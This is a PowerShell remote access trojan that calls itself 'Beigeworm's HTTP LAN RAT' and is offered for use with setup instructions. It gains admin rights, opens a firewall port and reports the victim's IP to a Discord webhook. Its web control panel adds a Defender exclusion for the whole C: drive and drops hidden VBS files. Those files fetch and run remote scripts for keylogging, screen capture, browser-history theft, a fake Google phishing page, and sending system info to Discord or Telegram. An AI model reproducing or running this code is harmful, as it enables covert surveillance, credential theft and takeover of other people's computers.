<#
============================== Beigeworm's HTTP LAN RAT ===============================

**THIS SCRIPT MUST BE EXECUTED AS ADMIN TO OPEN PORTS.**

SYNOPSIS
This script opens port 5000 on the machine and serves a simple webpage with powershell fuctions that can be executed.
Attacker device must be on the same local area network.
OPTIONAL - edit $whuri to you discord webhook to get a notification of the machines local IP

INSTRUCTIONS
Change all occurunces of WEBHOOK_HERE to a discord webhook
Change all occurunces of TELEGRAM_TOKEN and CHAT_ID to your TG bot token and bots chad ID
(Setup instructions here - https://github.com/beigeworm/BadUSB-Files-For-FlipperZero/blob/main/README.md)
Run script and input given URL in a browser on another device.

#>

$whuri = "$dc"

Write-Host "Starting Simple HTTP Server..." -ForegroundColor Green
Write-Host "#====================== Simple HTTP File Server ======================="

Add-Type -AssemblyName PresentationCore,PresentationFramework
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.Application]::EnableVisualStyles()

$Button = [System.Windows.MessageBoxButton]::OKCancel
$ErrorIco = [System.Windows.MessageBoxImage]::Information
$Ask = '        This Script Needs Administrator Privileges.

        Select "OK" to Run as an Administrator
        
        Select "Cancel" to Stop the Script
        
        (Needed for Opening Ports and Serving Files)'

If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
    Write-Host "Admin privileges needed for this script..." -ForegroundColor Red
    Write-Host "Sending User Prompt."
    $Prompt = [System.Windows.MessageBox]::Show($Ask, "Run as an Admin?", $Button, $ErrorIco) 
    Switch ($Prompt) {
        OK {
            Write-Host "This script will self elevate to run as an Administrator and continue."
            sleep 1
            Start-Process PowerShell.exe -ArgumentList ("-NoProfile -ExecutionPolicy Bypass -File `"{0}`"" -f $PSCommandPath) -Verb RunAs
            Exit
        }
        Cancel {
            Write-Host "Cancelling...." -ForegroundColor Red
            Exit
        }
    }
}


Write-Host "Detecting primary network interface."
$networkInterfaces = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.InterfaceDescription -notmatch 'Virtual' }

$filteredInterfaces = $networkInterfaces | Where-Object { $_.Name -contains 'Wi-Fi' -or  $_.Name -contains 'Ethernet'}

$primaryInterface = $filteredInterfaces | Select-Object -First 1

if ($primaryInterface) {
    if ($primaryInterface.Name -contains 'Wi-Fi') {
        Write-Output "Wi-Fi is the primary internet connection."
        $loip = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Wi*" | Select-Object -ExpandProperty IPAddress
    } elseif ($primaryInterface.Name -contains 'Ethernet') {
        Write-Output "Ethernet is the primary internet connection."
        $loip = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Eth*" | Select-Object -ExpandProperty IPAddress
    } else {
        Write-Output "Unknown primary internet connection."
    }
} else {
    Write-Output "No primary internet connection found."
}



New-NetFirewallRule -DisplayName "AllowWebServer" -Direction Inbound -Protocol TCP –LocalPort 5000 -Action Allow

$escmsgsys = $loip -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
$jsonsys = @{"username" = "$env:COMPUTERNAME" 
            "content" = $escmsgsys} | ConvertTo-Json
Start-Sleep 1
Invoke-RestMethod -Uri $whuri -Method Post -ContentType "application/json" -Body $jsonsys

Write-Host "Server Starting.."

$httpsrvlsnr = New-Object System.Net.HttpListener;

$httpsrvlsnr.Prefixes.Add("http://"+$loip+":5000/");
$httpsrvlsnr.Prefixes.Add("http://localhost:5000/");

$httpsrvlsnr.Start();
$webroot = New-PSDrive -Name webroot -PSProvider FileSystem -Root $PWD.Path
[byte[]]$buffer = $null
Write-Host "==== SESSION STARTED! ====" -ForegroundColor Green
while ($httpsrvlsnr.IsListening) {
    try {
        $ctx = $httpsrvlsnr.GetContext();
        
        if ($ctx.Request.RawUrl -eq "/") {
            $html = "<html><body><ul>"
            $html += "<br></br><h3>LAN Remote-Access-Trogan</h3>"
            $html += "<li><a href='/stop'>Kill Session</a></li>"
            $html += "<br></br>"
            $html += "<li><a href='/mini'>Minimize All Apps</a></li>"
            $html += "<li><a href='/update'>Send Fake Update</a></li>"
            $html += "<li><a href='/playgif'>Open GIF Player</a></li>"
            $html += "<li><a href='/disableav'>Nerf Defender</a></li>"
            $html += "<li><a href='/browhist'>Browser History</a></li>"
            $html += "<li><a href='/phish'>Fake Google Phishing Page</a></li>"
            $html += "<li><a href='/keymon'>Start Keylogger</a></li>"
            $html += "<li><a href='/screenmon'>Monitor Screen</a></li>"
            $html += "<li><a href='/dcinfo'>System Info (Discord)</a></li>"
            $html += "<li><a href='/tginfo'>System Info (Telegram)</a></li>"
            $html += "<li><a href='/wallpaper'>Wallpaper Jumpscare</a></li>"
            $html += "<li><a href='/acid'>Memz Graphic Effects</a></li>"
            $html += "<li><a href='/tgrat'>Start Telegram RAT</a></li>"
            $html += "</ul></body></html>"
            $buffer = [System.Text.Encoding]::UTF8.GetBytes($html);
            $ctx.Response.ContentLength64 = $buffer.Length;
            $ctx.Response.OutputStream.WriteAsync($buffer, 0, $buffer.Length)
        }
        elseif ($ctx.Request.RawUrl -match "^/stop") {
            $httpsrvlsnr.Stop();
            Remove-PSDrive -Name webroot -PSProvider FileSystem;
            Write-Host "==== ENDING SESSION ====" -ForegroundColor Red
        }

elseif ($ctx.Request.RawUrl -match "^/update") {     
$tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "C:\Windows\System32\scrnsave.scr"
WshShell.Run "chrome.exe --new-window -kiosk https://fakeupdate.net/win8", 1, False
WScript.Sleep 200
WshShell.SendKeys "{F11}"
'@
$pth = "$env:APPDATA\Microsoft\Windows\1021.vbs"
$tobat | Out-File -FilePath $pth -Force
sleep 1
Start-Process -FilePath $pth
sleep 10
Write-Output "Done."
Remove-Item -Path $pth -Force
}
elseif ($ctx.Request.RawUrl -match "^/playgif") {     
$tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200
WshShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W H -C irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/GIF-Play.ps1 | iex", 0, True
'@
$pth = "$env:APPDATA\Microsoft\Windows\1010.vbs"
$tobat | Out-File -FilePath $pth -Force
sleep 1
Start-Process -FilePath $pth
sleep 10
Write-Output "Done."
Remove-Item -Path $pth -Force
}
elseif ($ctx.Request.RawUrl -match "^/disableav") {
Add-MpPreference -ExclusionPath C:/
Write-Output "Done."
}
elseif ($ctx.Request.RawUrl -match "^/browhist") {     
$tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200
WshShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W H -C $dc='WEBHOOK_HERE'; irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/Brwsr-Hist.ps1 | iex", 0, True
'@
$pth = "$env:APPDATA\Microsoft\Windows\1011.vbs"
$tobat | Out-File -FilePath $pth -Force
sleep 1
Start-Process -FilePath $pth
sleep 10
Write-Output "Done."
Remove-Item -Path $pth -Force
}
elseif ($ctx.Request.RawUrl -match "^/phish") {     
$tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200
WshShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W H -C $dc='WEBHOOK_HERE'; irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/Google-Phish.ps1 | iex", 0, True
'@
$pth = "$env:APPDATA\Microsoft\Windows\1013.vbs"
$tobat | Out-File -FilePath $pth -Force
sleep 1
Start-Process -FilePath $pth
sleep 10
Write-Output "Done."
Remove-Item -Path $pth -Force
}
elseif ($ctx.Request.RawUrl -match "^/keymon") {     
$tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200
WshShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W H -C $dc='WEBHOOK_HERE'; irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/Keylog-to-DC.ps1 | iex", 0, True
'@
$pth = "$env:APPDATA\Microsoft\Windows\1014.vbs"
$tobat | Out-File -FilePath $pth -Force
sleep 1
Start-Process -FilePath $pth
sleep 10
Write-Output "Done."
Remove-Item -Path $pth -Force
}
elseif ($ctx.Request.RawUrl -match "^/screenmon") {     
$tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200
WshShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W H -C $dc='WEBHOOK_HERE'; irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/SShots-to-DC.ps1 | iex", 0, True
'@
$pth = "$env:APPDATA\Microsoft\Windows\1016.vbs"
$tobat | Out-File -FilePath $pth -Force
sleep 1
Start-Process -FilePath $pth
sleep 10
Write-Output "Done."
Remove-Item -Path $pth -Force
}
elseif ($ctx.Request.RawUrl -match "^/dcinfo") {     
$tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200
WshShell.Run "powershell.exe -NonI -Ep Bypass -W H -C $dc='WEBHOOK_HERE'; irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/Sys-Info-to-DC.ps1 | iex", 0, True
'@
$pth = "$env:APPDATA\Microsoft\Windows\1017.vbs"
$tobat | Out-File -FilePath $pth -Force
sleep 1
Start-Process -FilePath $pth
sleep 10
Write-Output "Done."
Remove-Item -Path $pth -Force
}
elseif ($ctx.Request.RawUrl -match "^/tginfo") {     
$tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200
WshShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W H -C $tg='TELEGRAM_TOKEN';$cid='CHAT_ID'; irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/Sys-Info-to-TG.ps1 | iex", 0, True
'@
$pth = "$env:APPDATA\Microsoft\Windows\1018.vbs"
$tobat | Out-File -FilePath $pth -Force
sleep 1
Start-Process -FilePath $pth
sleep 10
Write-Output "Done."
Remove-Item -Path $pth -Force
}
elseif ($ctx.Request.RawUrl -match "^/wallpaper") {     
$tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200
WshShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W H -C irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/wallpaper.ps1 | iex", 0, True
'@
$pth = "$env:APPDATA\Microsoft\Windows\1019.vbs"
$tobat | Out-File -FilePath $pth -Force
sleep 1
Start-Process -FilePath $pth
sleep 10
Write-Output "Done."
Remove-Item -Path $pth -Force
}
elseif ($ctx.Request.RawUrl -match "^/acid") {     
$tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200
WshShell.Run "powershell.exe -Ep Bypass -W H -C https://github.com/beigeworm/assets/blob/main/Scripts/GDI-haunter.ps1 | iex", 0, True
'@
$pth = "$env:APPDATA\Microsoft\Windows\1020.vbs"
$tobat | Out-File -FilePath $pth -Force
sleep 1
Start-Process -FilePath $pth
sleep 10
Write-Output "Done."
Remove-Item -Path $pth -Force
}
elseif ($ctx.Request.RawUrl -match "^/mini") {     
$apps = New-Object -ComObject Shell.Application
$apps.MinimizeAll()
Write-Output "Done."
}


    }
    catch [System.Net.HttpListenerException] {
        Write-Host "==== Server Information ====" -ForegroundColor Green
        Write-Host ($_);
    }
}
Write-Host "Server Stopped!" -ForegroundColor Green
